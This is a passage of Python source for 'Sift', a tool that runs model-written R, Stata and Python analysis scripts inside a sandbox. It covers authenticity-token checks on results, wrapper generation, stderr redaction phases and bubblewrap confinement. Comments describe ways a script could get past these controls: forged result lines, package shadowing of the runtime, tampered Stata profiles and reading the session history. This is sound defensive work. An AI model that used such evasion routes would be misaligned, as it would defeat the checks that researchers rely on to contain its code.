    # emitting some helpers, we KEEP the payloads that parsed and
    # validated cleanly. The caller decides what to do with them
    # (submit_script returns them under status="execution_failed_partial").
    # Without this, a script doing 24 specs that hit a thin cell on
    # iteration #5 would lose the four good results — the same loss
    # mode multi-result was meant to fix.
    payloads: list[dict] = []
    error: str | None = None
    warnings: list[str] = []
    if not result_path.exists():
        error = (
            "script finished but did not emit a structured result — no file "
            f"was written to {result_path.name}. Make sure your script "
            f"calls the Sift runtime library ({_runtime_call_hint(language)})."
        )
    else:
        try:
            # Enforce the file-byte cap up front so we don't allocate
            # a huge string for parsing. If the file is over-cap we
            # read just the first MAX_RESULT_FILE_BYTES bytes — any
            # JSONL line straddling the cut is dropped by the parser
            # via JSONDecodeError, and the truncation flag is set.
            file_size = result_path.stat().st_size
            byte_truncated = file_size > MAX_RESULT_FILE_BYTES
            with result_path.open("r", encoding="utf-8", errors="replace") as fh:
                if byte_truncated:
                    text = fh.read(MAX_RESULT_FILE_BYTES)
                else:
                    text = fh.read()
        except OSError as oe:
            error = f"could not read result file: {oe}"
        else:
            payloads, bad_lines, count_truncated = _parse_result_jsonl(text, run_token)
            if byte_truncated or count_truncated:
                cap_label = (
                    f"{MAX_RESULT_PAYLOADS} payload entries"
                    if count_truncated
                    else f"{MAX_RESULT_FILE_BYTES // (1024 * 1024)} MB result-file size"
                )
                warnings.append(
                    f"result truncated at {cap_label}; later helper "
                    f"emissions were dropped. If this is intentional, "
                    f"split the run into smaller batches."
                )
            if bad_lines:
                bad_msg = _format_bad_lines_summary(bad_lines, len(payloads))
                # Two paths, two meanings:
                #   - Some payloads survived alongside bad lines: the
                #     bad lines are an advisory, not a failure. A
                #     24-spec script with one runtime-library glitch
                #     on spec #5 should stay ``ok=True`` and surface
                #     the 23 good results — the prior "any bad line
                #     ⇒ ok=False" behavior demoted these to
                #     "execution_failed_partial", which reads to the
                #     model as "the script aborted" even when the
                #     subprocess exited 0.
                #   - No payloads survived: the bad-line message IS
                #     the only signal we have (this is the bypass-
                #     attempt case — a forged JSON line that fails
                #     the auth-token check produces zero survivors).
                #     Keep it in ``error`` so the caller sees a
                #     fatal-shaped response and the security signal
                #     isn't buried under a non-blocking warning.
                if payloads:
                    warnings.append(bad_msg)
                else:
                    error = bad_msg
            if error is None and not payloads:
                error = (
                    "script finished but emitted an empty result file. "
                    "Make sure your script calls the Sift runtime "
                    f"library ({_runtime_call_hint(language)})."
                )

    ok = (exit_code == 0) and bool(payloads) and (error is None)
    if not ok and error is None:
        error = f"interpreter exited with non-zero code {exit_code}"

    # Filter the plot manifest before any consumer (the runner's
    # ``_capture_plots``, ``submit_script``'s ``_summarize_plot_helpers``,
    # the recall path's allowlist check) reads it. Any entry whose
    # ``_token`` is missing or doesn't match the per-run token gets
    # dropped (script-injected entries gone). Done here rather than
    # at every consumer so there's exactly one trust boundary, and
    # because the recall path runs later when the per-run token is
    # no longer available to revalidate.
    dropped_manifest = _filter_plot_manifest(run_dir, run_token)
    if dropped_manifest:
        warnings.append(
            f"dropped {dropped_manifest} plot manifest entr"
            f"{'y' if dropped_manifest == 1 else 'ies'} "
            f"with missing or invalid authenticity token, "
            f"likely hand-crafted by the script bypassing the "
            f"helper library"
        )

    # Register the per-run token so the runner's ``_capture_plots``
    # can re-validate manifest entries directly. The on-disk filter
    # above is a best-effort optimization (smaller manifest); the
    # runner-side validation is the load-bearing one because the
    # manifest lives in script-writable territory and the rewrite
    # CAN fail without the token validation getting a second chance.
    register_run_token(run_dir, run_token)

    return _result(
        ok=ok, language=language,
        raw_stdout=raw_stdout, raw_stderr=raw_stderr,
        pre_user_stderr=pre_user_stderr,
        user_stderr=user_stderr,
        exit_code=exit_code, result_payloads=payloads,
        error=error,
        run_dir=run_dir, script_path=script_path,
        duration_seconds=duration,
        warnings=warnings,
    )


# ---------------------------------------------------------------------------
# Staging
# ---------------------------------------------------------------------------

def _make_run_dir(cwd: Path) -> Path:
    """Create a fresh per-run directory under <cwd>/.sift/runs/."""
    # Ensure .sift exists at mode 0o700 BEFORE creating the per-run
    # subtree. ``p.mkdir(parents=True, ...)`` would silently create
    # ``.sift`` with the default umask (0o755 on most systems), leaving
    # the raw subprocess logs (stdout.log / stderr.log), the pre-SDC
    # result.json, and the researcher-authored script file all
    # world-readable on shared filesystems. Gating .sift gates every
    # descendant via the no-execute-on-parent rule.
    from sift.config import ensure_private_sift_dir
    ensure_private_sift_dir(cwd)
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    run_id = uuid.uuid4().hex[:8]
    p = cwd / RUNS_SUBDIR / f"{timestamp}_{run_id}"
    p.mkdir(parents=True, exist_ok=True)
    return p


def _stage_runtime(run_dir: Path, language: Language) -> Path:
    """Copy the Sift runtime library for `language` into ``run_dir/lib``.

    Copying (rather than referencing) means the script sees a stable
    on-disk path regardless of whether Sift was installed as a wheel,
    frozen by PyInstaller, or run from source — and simplifies the
    Stata adopath case.
    """
    lib_dir = run_dir / "lib"
    lib_dir.mkdir(exist_ok=True)
    runtime_pkg = resources.files("sift.runtime")
    if language == "R":
        for name in ("sift.R",):
            src = runtime_pkg.joinpath(name)
            (lib_dir / name).write_text(
                src.read_text(encoding="utf-8"), encoding="utf-8",
            )
    elif language == "Stata":
        stata_ados = (
            "_sift_export_plot.ado",
            "sift_result_regress.ado",
            "sift_result_ttest.ado",
            "sift_ttest.ado",
            "sift_result_sum.ado",
            "sift_result_tab.ado",
            "sift_result_magnitude.ado",
            "sift_result_correlation.ado",
            "sift_result_km.ado",
            "sift_result_cluster.ado",
            "sift_result_factor.ado",
            "sift_plot_residuals.ado",
            "sift_plot_coefficients.ado",
            "sift_plot_interaction.ado",
            "sift_plot_estimate_comparison.ado",
            "sift_safe_export.ado",
        )
        for name in stata_ados:
            src = runtime_pkg.joinpath(name)
            (lib_dir / name).write_text(
                src.read_text(encoding="utf-8"), encoding="utf-8",
            )
    else:  # Python
        # Single module — staged into lib_dir which the script's
        # subprocess sees on PYTHONPATH (set in subprocess_env).
        # Researchers ``import sift`` to reach the helpers exactly
        # the way the R library does ``sift$from_lm`` / Stata does
        # ``sift_result_regress``.
        src = runtime_pkg.joinpath("sift.py")
        (lib_dir / "sift.py").write_text(
            src.read_text(encoding="utf-8"), encoding="utf-8",
        )
    return lib_dir


# Helper-program names the Stata wrapper `capture program drop`s.
# Kept as a module-level tuple so `_strip_redundant_wrapper_lines` and
# the wrapper-builder below stay in lock-step: if a new helper joins
# the staging list, only this tuple needs updating and both surfaces
# pick it up.
_STATA_SIFT_HELPER_NAMES: tuple[str, ...] = (
    "sift_result_regress",
    "sift_result_ttest",
    "sift_ttest",
    "sift_result_sum",
    "sift_result_tab",
    "sift_result_magnitude",
    "sift_result_correlation",
    "sift_result_km",
    "sift_result_cluster",
    "sift_result_factor",
    "sift_plot_residuals",
    "sift_plot_coefficients",
    "sift_plot_interaction",
    "sift_plot_estimate_comparison",
    "sift_safe_export",
    "_sift_export_plot",
)


# Exact lines the wrapper already runs. If they appear in the model's
# submitted code they are semantically a no-op (the wrapper has
# already set adopath, cd'd into the user's project, and dropped any
# stale helper definitions before user code starts), but they make
# the on-disk script.do / script.py noisier to read. The patterns
# below match VERBATIM — same Sift-internal env-var names and
# local-macro names a researcher would never write themselves — so
# this is safe to strip without inspecting context. If the model's
# code contains one of these as part of a larger expression, the
# line-equality check below leaves it alone (we only drop the line
# when the whole line equals one of these, modulo trailing whitespace
# and an optional immediately-following blank line so we don't leave
# orphan paragraph breaks).
_STATA_REDUNDANT_LINES: frozenset[str] = frozenset({
    "local lib : env SIFT_LIB_DIR",
    'adopath + "`lib\'"',
    "local sift_cwd : env SIFT_CWD",
    'cd "`sift_cwd\'"',
} | {
    f"capture program drop {name}" for name in _STATA_SIFT_HELPER_NAMES
})


def _strip_redundant_wrapper_lines(language: Language, code: str) -> str:
    """Drop lines from user code that the wrapper already runs.

    The wrapper (see ``_write_script``) sets up adopath, cd's into
    ``$SIFT_CWD``, and ``capture program drop``s every Sift helper
    before the user's script starts. When the model echoes those
    exact lines at the top of its submitted code (a learned habit
    from pre-split scripts that embedded the preamble inline) they
    are redundant — semantically a no-op, visually clutter that
    shows up every time the researcher opens ``script.do``.

    The strip targets EXACT-line matches against a small allowlist
    of Sift-internal patterns (env vars ``SIFT_LIB_DIR`` /
    ``SIFT_CWD``; local macros ``\\`lib'`` / ``\\`sift_cwd'``;
    helper names from ``_STATA_SIFT_HELPER_NAMES``). A researcher
    writing their own ``cd`` or ``adopath`` would not reference
    these Sift-internal names, so false-positive risk is bounded
    by what we put in the allowlist.

    Only Stata is wired up here. Python's wrapper does an fd-level
    stderr split that's not something a user-authored script would
    plausibly reproduce, so there's no equivalent superstition to
    strip on that side (the redundant-imports case can wait until
    we see it in the wild).

    The function preserves all other content verbatim, including
    blank lines, indentation, and comments. A single blank line
    immediately following a stripped line is also dropped so the
    leading paragraph doesn't end up with an orphan break.
    """
    if language != "Stata" or not code:
        return code
    lines = code.split("\n")
    out: list[str] = []
    i = 0
    while i < len(lines):
        line = lines[i]
        if line.rstrip() in _STATA_REDUNDANT_LINES:
            # Skip this line. If the very next line is blank,
            # skip it too — it was the spacer between the
            # plumbing block and the real code.
            if (i + 1 < len(lines)
                    and out
                    and (not out or out[-1].rstrip() == "")
                    and lines[i + 1].rstrip() == ""):
                i += 2
                continue
            i += 1
            continue
        out.append(line)
        i += 1
    # Trim a leading run of blank lines the strip may have exposed.
    while out and out[0].rstrip() == "":
        out.pop(0)
    return "\n".join(out)


def _write_script(run_dir: Path, language: Language, code: str) -> Path:
    """Persist Claude's code to disk and return the path the runner invokes.

    The researcher's code lands at ``<run_dir>/script.{do,py,R}`` —
    clean, no Sift plumbing — so opening that file in Stata / RStudio /
    a text editor shows the same bytes the model wrote, nothing more.

    For Stata and Python, a separate ``_sift_wrapper.{do,py}`` file
    holds the executor preamble (adopath / cd / capture drops for
    Stata; sys.path manipulation and fd-level stderr split for
    Python) and then sources or runpy-loads ``script.{do,py}``. The
    runner is invoked against the wrapper; users (and the model on
    recall) only ever see ``script.*``.

    Earlier versions concatenated preamble + user code into a single
    ``script.*`` file because an earlier attempt at a wrapper-based
    split hit a nested-do path bug. The bug was a missing-quote
    artifact, not a Stata limitation: a quoted ``do "<abs path>"``
    handles paths with spaces fine. The current split keeps the
    runner's actual entry-point (wrapper) and the user-visible
    artifact (script.*) cleanly separated.

    For R, no preamble is needed — the runtime is sourced via the
    ``Rscript`` command line (see ``_r_command``) — so ``script.R``
    is already clean and no wrapper file exists.
    """
    # Drop any wrapper-equivalent boilerplate the model echoed at
    # the top of its submission (Stata-only at the moment — see
    # the helper's docstring for the rationale). Semantically a
    # no-op since the wrapper still runs the same commands; the
    # value is a clean on-disk ``script.do``.
    code = _strip_redundant_wrapper_lines(language, code)
    if language == "R":
        path = run_dir / "script.R"
        path.write_text(code, encoding="utf-8")
        return path
    if language == "Python":
        # Two-line preamble puts the staged ``sift.py`` AND the Sift
        # Python package install dir on ``sys.path``. We use a
        # preamble (rather than PYTHONPATH) because the interpreter
        # is invoked with ``-I`` (isolated mode), which ignores all
        # PYTHON* env vars by design — keeps a researcher's stray
        # ``PYTHONSTARTUP`` from running before their script. Same
        # shape as the Stata adopath preamble: explicit, visible in
        # the scratch dir, easy to audit.
        #
        # The Sift pkg dir entry is critical for the
        # ``install_packages`` → ``submit_script`` path. ``--user``
        # writes get filtered by ``-I`` and the sandbox; ``--target
        # <sift_python_pkg_dir>`` is the path both surfaces share.
        # See ``package_installer.sift_python_pkg_dir``.
        #
        # ORDER matters here: ``lib_dir`` MUST end up before
        # ``pkg_dir`` on ``sys.path`` so the staged Sift runtime
        # always wins over any installed package of the same name.
        # If pkg_dir came first, a model-authored
        # ``install_packages(["sift"])`` call (or any package whose
        # wheel ships a top-level ``sift`` module) would shadow the
        # staged ``sift.py``, bypassing the ``SIFT_RUN_TOKEN`` pop
        # and the authenticity-token machinery the runtime owns.
        # And we ``append`` pkg_dir (rather than ``insert(0, ...)``)
        # so it sits after stdlib — an installed package can't
        # shadow ``os`` / ``json`` / etc.
        from sift.package_installer import sift_python_pkg_dir
        from sift.env_detect import find_python
        lib_dir = run_dir / "lib"
        py_tool = find_python()

        # Two-buffer stderr split. The fd-level swap below is the
        # load-bearing SDC invariant for phase-aware redaction:
        #
        #   Phase 0 (subprocess.PIPE stderr): everything that lands
        #     on fd 2 BEFORE the preamble's first dup2 runs. That's
        #     dyld / xcselect / libxcrun output and any sandbox-deny
        #     messages from before Python's interpreter is even
        #     alive. By construction no user code has touched data.
        #     Safe to forward unredacted.
        #   Phase A (stderr.phase_a file): writes between the first
        #     dup2 and the marker-line dup2. Captures preamble-own
        #     output. Still pre-user-code; the user's ``import sift``
        #     happens AFTER the marker swap so even runtime-import
        #     errors do not land here. Safe to forward unredacted.
        #   Phase B (stderr.phase_b file): writes after the marker
        #     swap. User code is running; anything in this buffer is
        #     potentially script-controlled (``print(df.head(),
        #     file=sys.stderr)`` followed by a segfault, for
        #     instance — no Python traceback, but real cell content
        #     in the buffer). The error-summary layer routes this
        #     through frame classification and redacts bodies
        #     except where the deepest frame is in Sift-owned code.
        #
        # The classifier that USED to live in error_summary leaned on
        # "no traceback ⇒ pre-user-code", which leaks under
        # signal-aborted user code that wrote to stderr before
        # dying. The buffer split enforces the boundary at the
        # kernel level via dup2 instead of inferring it from text
        # shape — that's the part that doesn't depend on Python's
        # traceback machinery being intact when the failure fires.
        phase_a_path = run_dir / "stderr.phase_a"
        phase_b_path = run_dir / "stderr.phase_b"
        # Researcher's clean code lives at script.py. The wrapper
        # below loads it via `runpy.run_path(..., run_name="__main__")`
        # so tracebacks reference `script.py` and `if __name__ ==
        # "__main__":` blocks fire — exactly as if the user ran
        # `python script.py` directly.
        script_path = run_dir / "script.py"
        script_path.write_text(code + "\n", encoding="utf-8")
        wrapper_lines = [
            "import sys as _sift_sys",
            "import os as _sift_os",
            # Open phase-A buffer and replace fd 2. dup2 closes the
            # existing fd 2 (the pipe end inherited from the parent),
            # so subprocess.PIPE stops receiving stderr at this
            # point — phase 0 is exactly the bytes already on the
            # pipe when this line runs.
            f"_sift_pha_fd = _sift_os.open({str(phase_a_path)!r}, "
            "_sift_os.O_WRONLY | _sift_os.O_CREAT | _sift_os.O_TRUNC, 0o644)",
            "_sift_os.dup2(_sift_pha_fd, 2)",
            "_sift_os.close(_sift_pha_fd)",
        ]
        if py_tool is not None:
            pkg_dir = sift_python_pkg_dir(py_tool.binary)
            wrapper_lines.append(
                f"_sift_sys.path.append({str(pkg_dir)!r})"
            )
        wrapper_lines.append(
            f"_sift_sys.path.insert(0, {str(lib_dir)!r})"
        )
        wrapper_lines.extend([
            # Swap to phase-B buffer just before user code starts.
            # ``sys.stderr.flush()`` first so any Python-buffered
            # bytes from the wrapper are forced to phase A rather
            # than leaking into phase B at the next implicit flush.
            f"_sift_phb_fd = _sift_os.open({str(phase_b_path)!r}, "
            "_sift_os.O_WRONLY | _sift_os.O_CREAT | _sift_os.O_TRUNC, 0o644)",
            "_sift_sys.stderr.flush()",
            "_sift_os.dup2(_sift_phb_fd, 2)",
            "_sift_os.close(_sift_phb_fd)",
            # Hand off to the researcher's script. ``runpy.run_path``
            # opens its own fresh globals dict with ``__name__``
            # set to "__main__" and ``__file__`` set to the script
            # path, so the user's code sees the same namespace it
            # would under a plain ``python script.py`` invocation
            # — tracebacks reference ``script.py`` and the wrapper's
            # ``_sift_*`` names never leak into user scope.
            "import runpy as _sift_runpy",
            f"_sift_runpy.run_path({str(script_path)!r}, "
            "run_name='__main__')",
        ])
        wrapper = "\n".join(wrapper_lines) + "\n"
        wrapper_path = run_dir / "_sift_wrapper.py"
        wrapper_path.write_text(wrapper, encoding="utf-8")
        return wrapper_path
    # Stata: clean script.do + wrapper _sift_wrapper.do. The wrapper
    # carries the preamble (capture drops, adopath, cd) and ends
    # with a quoted nested ``do "<abs path>/script.do"`` that hands
    # off to the researcher's code. Quoted absolute paths inside a
    # nested ``do`` handle spaces fine — only the command-line
    # ``-b do <path>`` invocation has the tokenization concern
    # (handled in ``_stata_command``).
    #
    # Shadowing defense: Stata batch mode runs ``~/ado/profile.do`` at
    # startup BEFORE the wrapper, so any program defined there
    # (``program define sift_result_regress ...malicious...``) ends
    # up in memory ahead of the preamble. Stata's resolver checks
    # in-memory programs before the adopath, so a tampered profile.do
    # would shadow the staged ``sift_result_regress.ado`` (and any
    # other helper) even though the adopath ``+ SIFT_LIB_DIR`` runs
    # first.
    #
    # We previously used ``capture program drop _all`` to nuke every
    # in-memory program. That defended Sift's helpers but ALSO wiped
    # the researcher's own profile.do helpers (custom estimators,
    # workflow shortcuts) — scripts that work in plain Stata then
    # failed inside Sift. Switching to an explicit drop list keeps
    # the shadowing defense tight without touching unrelated user
    # programs. Names mirror ``_stage_runtime_library``'s ``stata_ados``
    # tuple; new helpers added there must be added here too. ``capture``
    # suppresses the error when a name isn't currently defined (the
    # common case — most profile.do files don't pre-define any of
    # these).
    # Pulled from ``_STATA_SIFT_HELPER_NAMES`` so adding a helper
    # in one place updates both the wrapper's drop block and the
    # ingress strip's allowlist together.
    sift_program_drops = "\n".join(
        f"capture program drop {name}"
        for name in _STATA_SIFT_HELPER_NAMES
    )
    script_path = run_dir / "script.do"
    script_path.write_text(code + "\n", encoding="utf-8")
    wrapper = (
        f"{sift_program_drops}\n"
        "local lib : env SIFT_LIB_DIR\n"
        "adopath + \"`lib'\"\n"
        "local sift_cwd : env SIFT_CWD\n"
        "cd \"`sift_cwd'\"\n"
        "\n"
        # Phase-boundary marker. Stata's batch log echoes every
        # ``display`` to stdout, so this line is guaranteed to appear
        # in the log at a known position. The error-summary layer
        # finds the FIRST occurrence of this exact string in the log
        # and classifies any failing command BEFORE that position as
        # sift_owned (preamble), AFTER as user_code. The marker text
        # is intentionally Sift-identifiable but not token-bearing —
        # the attack surface is "user re-displays the marker to
        # confuse classification", and the first-occurrence rule
        # makes that ineffective: the real marker is always emitted
        # before any user code runs.
        "display \"_SIFT_STATA_PREAMBLE_END_MARKER_\"\n"
        # Hand off to the researcher's clean script. Absolute path
        # so this resolves regardless of the user's SIFT_CWD setting
        # (``cd "\`sift_cwd'"`` above already moved into the project
        # dir for the user's ``use "data.dta"`` to work).
        f"do \"{script_path.as_posix()}\"\n"
    )
    wrapper_path = run_dir / "_sift_wrapper.do"
    wrapper_path.write_text(wrapper, encoding="utf-8")
    return wrapper_path


# ---------------------------------------------------------------------------
# Command composition
# ---------------------------------------------------------------------------

def _python_command(python: str, script_path: Path) -> list[str]:
    """Compose a ``python3`` invocation for the user's script.

    ``-I`` (isolated mode) cuts the per-user site-packages dir and
    ``PYTHONSTARTUP`` out of the picture so the script runs against
    the interpreter's stdlib + the Sift-staged runtime + whatever's
    on ``PYTHONPATH`` (which the executor sets to ``lib_dir`` plus
    inherited paths). No ``site.USER_BASE`` reads, no surprise
    pre-script hooks.
    """
    return [python, "-I", str(script_path)]


def _r_command(rscript: str, lib_dir: Path, script_path: Path) -> list[str]:
    """Compose `Rscript` invocation that sources the runtime before the script.

    Using ``-e`` keeps the wrapper logic transparent: researchers reading
    the scratch dir see their code unchanged, and the Sift preamble
    is explicit in the process args.
    """
    source_lib = (lib_dir / "sift.R").as_posix()
    source_script = script_path.as_posix()
    bootstrap = (
        f'source({_r_quote(source_lib)}); '
        f'source({_r_quote(source_script)})'
    )
    return [rscript, "--vanilla", "-e", bootstrap]


def _r_quote(s: str) -> str:
    """R string literal with double quotes, backslash-escaped."""
    escaped = s.replace("\\", "\\\\").replace('"', '\\"')
    return f'"{escaped}"'


def _stata_command(stata: str, lib_dir: Path, script_path: Path) -> list[str]:
    """Compose `stata-mp -b do` invocation.

    Stata's batch mode writes output to a .log file next to the .do
    script (not stdout), so the executor reads that log after the
    process exits.

    Path handling: we pass the script as a **bare filename** and rely
    on the subprocess cwd being the scratch dir. Absolute paths don't
    work here — Stata's batch-mode argument parser tokenizes
    ``-b do <path>`` on spaces, so a researcher whose project lives
    under ``~/Work Folder/...`` would hit ``file /Users/you/Work.do
    not found`` even though the shell passed a perfectly-quoted
    argument. See ``run_script`` for where subprocess_cwd is set to
    run_dir for Stata.
    """
    del lib_dir  # the .do script itself prepends adopath with $SIFT_LIB_DIR
    return [stata, "-b", "-q", "do", script_path.name]


def _read_stata_log(script_path: Path | None) -> str:
    """Return the Stata batch log contents, or '' if missing."""
    if script_path is None:
        return ""
    log_path = script_path.with_suffix(".log")
    if not log_path.exists():
        return ""
    try:
        return log_path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return ""


def _read_phase_file(path: Path) -> str:
    """Read one of the buffer-split stderr files, returning '' if absent.

    Phase files only exist for Python runs whose preamble got far
    enough to ``os.open`` them. Missing files are normal for R /
    Stata runs and for Python runs that crashed before the first
    ``dup2``; in either case we want '' rather than an exception.
    """
    if not path.exists():
        return ""
    try:
        return path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return ""


def _split_stderr_buffers(
    language: "Language", pipe_stderr: str, run_dir: Path,
) -> tuple[str, str, str]:
    """Return ``(pre_user_stderr, user_stderr, raw_stderr)``.

    For Python the executor's preamble ``dup2``'d fd 2 onto
    ``stderr.phase_a`` at startup and onto ``stderr.phase_b`` just
    before the marker line. The pipe captured anything that hit
    fd 2 BEFORE the first ``dup2`` (phase 0 — dyld / xcselect /
    libxcrun / sandbox-deny output). All three streams concatenate
    into ``raw_stderr`` for display, but the SDC posture differs:

      * ``pre_user_stderr`` = phase 0 + phase A. No user code ran
        by construction, so the bytes here cannot contain
        researcher data. Safe to forward unredacted.
      * ``user_stderr`` = phase B. User code was running when these
        bytes were written; ``print(df.head(), file=sys.stderr)``
        followed by a segfault lands here too. Must go through
        frame classification before any unredacted forwarding.

    R / Stata don't have a buffer split today; they get the pipe
    stderr as ``pre_user_stderr`` and an empty ``user_stderr``,
    which keeps the legacy SDC posture intact (the error-summary
    layer falls back to full redaction whenever ``user_stderr``
    is missing).
    """
    if language == "Python":
        phase_a = _read_phase_file(run_dir / "stderr.phase_a")
        phase_b = _read_phase_file(run_dir / "stderr.phase_b")
        pre_user = pipe_stderr + phase_a
        user = phase_b
    else:
        pre_user = pipe_stderr
        user = ""
    return pre_user, user, pre_user + user


# ---------------------------------------------------------------------------
# Sandbox profile
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Linux confinement — bubblewrap
# ---------------------------------------------------------------------------
#
# Same threat model and the same load-bearing role as
# ``_build_profile``'s SBPL text on macOS: a script running here must
# not be able to read the researcher's files outside the analysis
# workspace, must not be able to reach the network at all, and must
# not be able to read or tamper with Sift's own session state
# (``.sift``) even though that directory technically lives inside the
# cwd it's allowed to touch.
#
# The mechanism is different because the two sandboxes work in
# opposite directions. ``sandbox-exec`` starts from the real
# filesystem and subtracts (a ``(deny default)`` profile with
# explicit re-allows). ``bwrap`` starts from NOTHING — an empty
# mount namespace — and the child sees only what is explicitly bound
# in. That inversion is actually a stronger default (there is no
# "everything except what I remembered to deny" failure mode), but it
# means paths must be bound in deliberately, including the system
# trees an interpreter needs just to start up.
#
# Verified empirically against this exact recipe (not just reasoned
# about) during development: a script cannot read a file placed
# outside the allowed trees, cannot write outside run_dir/cwd
# (including a proof that binding a single file's parent directory
# read-only is NOT enough — the parent itself must be bound, or its
# auto-created mountpoint is left writable), cannot see host processes
# (PID namespace isolation — bwrap's ``--proc`` combined with
# ``--unshare-pid`` mounts a FRESH procfs scoped to the sandbox's own
# namespace, not the host's, so this is actually strictly stronger
# process isolation than sandbox-exec provides on macOS, which does
# not unshare the PID namespace at all), and that the ``.sift``
# carve-out genuinely isolates writes — a script writing to a shadowed
# path lands in the ephemeral tmpfs and never touches the real file on
# disk. See ``tests/test_bwrap_sandbox.py`` for the automated version
# of each of those checks, run for real against the actual ``bwrap``
# binary (not mocked) wherever one is available.


def _bwrap_argv(
    run_dir: Path, cwd: Path, home: Path,
    extra_read_paths: tuple[str, ...] = (),
) -> list[str]:
    """Build the bubblewrap argument list (everything after the
    ``bwrap`` binary itself; the caller appends the actual command to
    run). Pure function — only touches the filesystem to check
    whether a given system path exists on THIS machine before binding
    it, so it degrades gracefully across distributions that lay out
    ``/lib64`` or similar differently. No process is spawned here.
    """
    args: list[str] = [
        # Unshares user, ipc, pid, net, uts, and cgroup namespaces in
        # one flag. The net unshare is the load-bearing one for the
        # data-boundary story — with no network namespace at all, the
        # child has no interface to bind or connect from, which is a
        # stronger guarantee than a firewall rule (nothing to
        # misconfigure, no DNS-over-alternate-port trick to block).
        "--unshare-all",
        # If the bwrap parent process (this one) dies unexpectedly,
        # kill the sandboxed child rather than leaving it orphaned
        # and unsupervised.
        "--die-with-parent",
        # Prevents the TIOCSTI ioctl terminal-injection trick (a
        # process with a controlling terminal can use it to push
        # bytes into another process's input stream on that same
        # terminal). Standard bubblewrap hardening recommendation for
        # any workload sharing a terminal with untrusted code.
        "--new-session",
        # Fresh, empty /proc scoped to this sandbox's own PID
        # namespace (see module-level comment: this is why bwrap
        # gives strictly stronger process isolation than sandbox-exec
        # here — the sandboxed script cannot enumerate or signal any
        # host process, only itself).
        "--proc", "/proc",
        # Minimal synthetic /dev (null, zero, full, random, urandom,
        # a pty) rather than binding the host's real /dev, which
        # would expose raw block/char device nodes.
        "--dev", "/dev",
    ]

    def _ro_bind_if_exists(path: str) -> None:
        if Path(path).exists():
            args.extend(["--ro-bind", path, path])

    # System trees needed for binaries and libraries.  ``/etc`` and
    # ``/opt`` are deliberately not exposed wholesale: production and
    # lab workstations commonly keep service credentials/configuration
    # there. Runtime installs under /opt arrive through the narrow
    # interpreter-specific paths below.
    for sys_path in (
        "/usr", "/bin", "/sbin", "/lib", "/lib32", "/lib64",
    ):
        _ro_bind_if_exists(sys_path)

    # Narrow system configuration required for dynamic linking,
    # locales, time zones, certificates, font discovery, and R startup.
    # Never widen this back to all of /etc merely to fix one runtime;
    # add the specific documented dependency here instead.
    for config_path in (
        "/etc/ld.so.cache",
        "/etc/locale.alias",
        "/etc/localtime",
        "/etc/nsswitch.conf",
        "/etc/hosts",
        "/etc/resolv.conf",
        "/etc/protocols",
        "/etc/services",
        "/etc/ssl",
        "/etc/pki",
        "/etc/ca-certificates",
        "/etc/fonts",
        "/etc/R",
    ):
        _ro_bind_if_exists(config_path)

    # Interpreter-specific extras — e.g. a venv/pyenv/conda Python's
    # sys.prefix tree, or Sift's own managed pip --target dir for
    # ``install_packages``. Same mechanism and same caller-supplied
    # values as the macOS profile's ``extra_read_paths`` parameter.
    for p in extra_read_paths:
        if p and Path(p).is_absolute():
            _ro_bind_if_exists(p)

    # R's conventional Linux ``~/R`` user-library location. Read-only:
    # package installation happens OUTSIDE this sandbox entirely (see
    # ``package_installer.py``); a script run here only ever needs to
    # LOAD already-installed packages via ``library()``, never write
    # new ones. NOTE: unlike the Python path above, this is NOT
    # empirically verified against a real R installation — there is
    # no R interpreter available in the environment this backend was
    # built and tested in. The binding logic itself (existence-
    # checked, read-only) follows the same verified pattern as
    # everything else here, but flag this specific path as
    # "built, not proven" in any security review.
    _ro_bind_if_exists(str(home / "R"))
    # Do not bind ``~/.R`` wholesale. ``Rscript --vanilla`` does not load
    # per-user startup configuration, and actual user-library roots are
    # discovered by ``find_r`` and passed through ``extra_read_paths``. A
    # broad hidden-directory bind could expose credentials or unrelated
    # project configuration for no runtime benefit.

    # Writable: the researcher's analysis workspace and this run's
    # scratch directory — same two-path write scope as macOS. Bound
    # BEFORE the ``.sift`` mask below so the mask (and the run_dir
    # re-exposure after it) can shadow the relevant part of this
    # already-bound tree; bwrap applies binds in argv order, and a
    # later bind at an equal-or-nested path takes precedence over an
    # earlier one.
    args.extend(["--bind", str(cwd), str(cwd)])
    args.extend(["--bind", str(run_dir), str(run_dir)])

    # The ``.sift`` carve-out — the same property the macOS profile
    # enforces with an explicit ``(deny ... (subpath sift_dir))``
    # followed by a re-allow of just ``run_dir``. Sift's own session
    # state (results.db, chat_history.jsonl, the release ledger, prior
    # run logs) lives under ``<cwd>/.sift`` and must never be
    # readable OR writable by a script — readable would let a script
    # exfiltrate the full unsanitized result history through any
    # surviving channel; writable would let it tamper with the audit
    # trail or forge chat history.
    #
    # ``--tmpfs <path>`` mounted AFTER the cwd bind above shadows
    # everything already at that path with a fresh, empty,
    # sandbox-local filesystem — the real ``.sift`` contents become
    # invisible, and anything the script writes there vanishes into
    # the ephemeral tmpfs, never touching the real files (verified:
    # see the module-level comment). The run_dir bind that follows
    # re-exposes THIS run's own scratch subtree (which lives inside
    # ``.sift/runs/...``) on top of that mask, exactly mirroring the
    # macOS "deny .sift, then re-allow run_dir" sequencing.
    sift_dir = cwd / ".sift"
    args.extend(["--tmpfs", str(sift_dir)])
    args.extend(["--bind", str(run_dir), str(run_dir)])

    # Lock the synthetic root. bwrap builds its container root from
    # nothing and lazily materialises any directory it needs as a
    # mount point — including paths that were never explicitly bound
    # at all. Discovered empirically during development (not merely
    # reasoned about): with no ``--remount-ro /``, a script can
    # ``open("/anything/at/all", "w")`` and it SUCCEEDS, auto-vivifying
    # ``/anything/at/all`` inside the sandbox's own ephemeral root.
    # That write never reaches the real host filesystem (it lives in
    # a private mount namespace destroyed when the sandbox exits, so
    # it is not an exfiltration or persistence risk), but it IS a
    # resource-exhaustion gap: those writes are backed by real host
    # memory, ``RLIMIT_FSIZE`` only caps a single file's size (not the
    # sum across many files at many auto-vivified paths), and
    # ``RLIMIT_AS`` does not cover memory backing a written file
    # unless the process maps it into its own address space. A
    # script could otherwise write an unbounded number of
    # under-the-cap files to arbitrary invented paths and exhaust
    # host RAM despite every rlimit in ``resource_limits_preexec``
    # being honoured individually.
    #
    # ``--remount-ro DEST`` remounts an EXISTING mount read-only
